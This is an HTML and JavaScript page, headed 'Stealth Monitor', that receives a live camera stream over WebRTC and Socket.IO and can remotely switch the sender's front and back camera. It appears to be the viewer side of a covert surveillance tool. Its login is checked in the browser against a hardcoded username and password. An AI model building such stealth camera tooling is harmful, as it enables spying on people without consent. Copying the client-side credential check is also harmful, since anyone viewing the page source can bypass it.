<!DOCTYPE html>
<html>
<head>
    <title>Secure Monitor</title>
    <style>
        body { background: #111; color: white; text-align: center; font-family: sans-serif; }
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .login-box { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #f85606; }
        input { padding: 10px; margin: 10px; width: 220px; border-radius: 5px; border: none; }
        button { padding: 12px 25px; background: #f85606; color: white; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; }
        #monitor-ui { display: none; padding: 20px; }
        video { width: 80%; max-width: 700px; background: #000; border: 2px solid #333; border-radius: 10px; }
        .btn-switch { padding: 15px 30px; background: red; color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div id="login-overlay">
        <div class="login-box">
            <h2>ðŸ”’ Security Access</h2>
            <input type="text" id="user" placeholder="Username">
            <input type="password" id="pass" placeholder="Password"><br>
            <button onclick="checkLogin()">Login & View</button>
            <p id="err" style="color: red;"></p>
        </div>
    </div>

    <div id="monitor-ui">
        <h2>ðŸš€ Stealth Monitor</h2>
        <video id="live" autoplay playsinline controls></video><br>
        <button class="btn-switch" onclick="switchCam()">ðŸ”„ Switch Front/Back Camera</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const DB_USER = "admin", DB_PASS = "rony25";
        let socket, pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });

        function checkLogin() {
            if (document.getElementById("user").value === DB_USER && document.getElementById("pass").value === DB_PASS) {
                document.getElementById("login-overlay").style.display = "none";
                document.getElementById("monitor-ui").style.display = "block";
                initSocket();
            } else { document.getElementById("err").innerText = "Wrong!"; }
        }

        function initSocket() {
            socket = io();
            socket.emit("ready");
            pc.ontrack = e => { document.getElementById("live").srcObject = e.streams[0]; };
            socket.on("offer-front", async o => {
                await pc.setRemoteDescription(new RTCSessionDescription(o));
                const a = await pc.createAnswer();
                await pc.setLocalDescription(a);
                socket.emit("answer-front", a);
            });
            socket.on("ice-front", c => pc.addIceCandidate(new RTCIceCandidate(c)));
        }

        function switchCam() { socket.emit("switch-camera"); }
    </script>
</body>
</html>

